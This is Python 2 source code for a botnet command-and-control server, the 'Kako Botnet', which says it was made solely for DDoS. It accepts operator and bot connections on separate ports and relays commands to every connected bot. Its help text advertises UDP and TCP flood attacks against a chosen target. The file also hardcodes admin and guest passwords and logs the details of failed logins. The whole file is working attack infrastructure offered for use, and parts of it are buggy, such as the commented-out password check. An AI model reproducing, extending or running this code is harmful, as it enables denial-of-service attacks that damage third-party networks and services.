import sys
import time
import socket
import thread
import threading
from json import load
from urllib2 import urlopen
from thread import start_new_thread

connect = "localhost"
conport = 8080
infport = 8888

clients = 0
bots = 0

rankAdmin = "Admin"
pwordAdmin = "LawOfTime22!"

rankGuest = "Guest"
pwordGuest = "DeathToGuests44!"

bc = []

print("Remember to add unwanted IP Addresses into the banned list before anyone starts to connect.")
print("If it doesn't say both Server and Bot started there is a problem.")

def clientDisconnect():
	global clients
	clients = clients - 1

def botDisconnect():
	global bots
	bots = bots - 1
	
def clientThread(conn, addr):
	createBanned = file("banned.txt", "a")
	banned = file("banned.txt")
	if addr[0] in banned:
		conn.send("[!] Your IP Address has been banned.\r\n")
		conn.send("[>] Please contact live:zerefdragneelbro on skype for this to be removed. [<]\r\n")
		clientDisconnect()
		sys.exit()
	else:
		pass

	def rank(conn, prefix="Rank: "):
		conn.send(prefix)
		return conn.recv(512)

	def password(conn, prefix="Rank Password: "):
		conn.send(prefix)
		return conn.recv(512)

	def nickname(conn, prefix="Nickname: "):
		conn.send(prefix)
		return conn.recv(512)

	rank = rank(conn)
	#password = password(conn)
	#nickname = nickname(conn)
	password = "Password"
	nickname = "Law"
	#if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
	if rank.startswith(rankAdmin) or rank.startswith(rankGuest):
		conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
		conn.sendall("[>] Made solely for DDoS but that depends on your bot [<]\r\n")
		conn.sendall("[!] If you do anything I, Law, disapprove of I will not hesitate to ban your IP Address. Everything is logged.\r\n")
		conn.sendall("[?] Type >help for a list of commands [?]\r\n")
		conn.sendall("[?] Your nickname is: %s" % nickname)
		while True:
			try:
				message = conn.recv(512)
				if message:
					reply = message
					broadcast(reply, conn)
				else:
					remove(conn)

				logs = file("logs.txt", "a")
				logs.write("%s:%s:%s - %s\r\n" % (rank, password, nickname, message))

				if message.lower().startswith(">help"):
					conn.sendall("[>] Helpful Info [<]\r\n")
					conn.sendall("[>] and [<] = Notice\r\n")
					conn.sendall("[?] = Information\r\n")
					conn.sendall("[!] = Warning\r\n")
					conn.sendall("\r\n")
					conn.sendall("[>] Server Commands [<]\r\n")
					conn.sendall("[?] >help - Displays a help menu like this\r\n")
					conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
					conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
					conn.sendall("\r\n")
					conn.sendall("[>] Bot Commands [<]\r\n")
					conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
					conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
					conn.sendall("[?] >killbots - Disconnects all bots\r\n")

				if message.lower().startswith(">status"):
					conn.sendall("[+] Clients Connected: %s\r\n" % clients)
					conn.sendall("[+] Bots Connected: %s\r\n" % bots)

				if message.lower().startswith(">credits"):
					conn.sendall("[?] Law - Idea and main Programmer(AKA the guy who made this command)\r\n")
					conn.sendall("[?] Picses - Coded the bot connection\r\n")
					conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
			except:
				break
			if not message:
				break
		clientDisconnect()
		conn.close()
	else:
		try:
			ip = load(urlopen('http://jsonip.com'))['ip']
			fail = file("fails.txt", "a")
			fail.write("%s:%s:%s:%s\r\n" % (ip, rank, password, nickname))
			conn.send("[!] Incorrect Information!\r\n")
			conn.send("[!] Your IP Address has been logged.\r\n")
			clientDisconnect()
			time.sleep(3)
			conn.close()
		except:
			clientDisconnect()
			conn.close

def startClient():
	host = connect
	port = conport
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind((host, port))
	sock.listen(999999)
	time.sleep(0.10)
	print("[+] Server Started")
	while True:
		global clients
		time.sleep(1)
		conn, addr = sock.accept()
		bc.append(conn)
		clients = clients + 1

		start_new_thread(clientThread, (conn, addr))
	sock.close()

def bot_thread(conn):
	while True:
		try:
			data = conn.recv(512)
		except:
			pass
		if not data:
			print "[-] Bot Disconnected"
			conn.close()
			break
	botDisconnect()
	conn.close()

def startBot():
	host = connect
	port = infport
	infsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	infsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	infsock.bind((host, port))
	infsock.listen(999999)
	time.sleep(0.5)
	print("[+] Bot Started")
	while True:
		global bots
		time.sleep(1)
		conn, addr = infsock.accept()
		bc.append(conn)
		bots = bots + 1

		start_new_thread(bot_thread, (conn,))
	infsock.close()

def broadcast(message, connection):
    for bots in bc:
        if bots != connection:
            try:
                bots.sendall(message)
            except:
                bots.close()
                remove(bots)

def remove(connection):
    if connection in bc:
        bc.remove(connection)

client = threading.Thread(target=startClient, args=(""), name='Client Session Handler')
client.start()

botnet = threading.Thread(target=startBot, args=(""), name='Bot Session Handler')
botnet.setDaemon(True)
botnet.start()
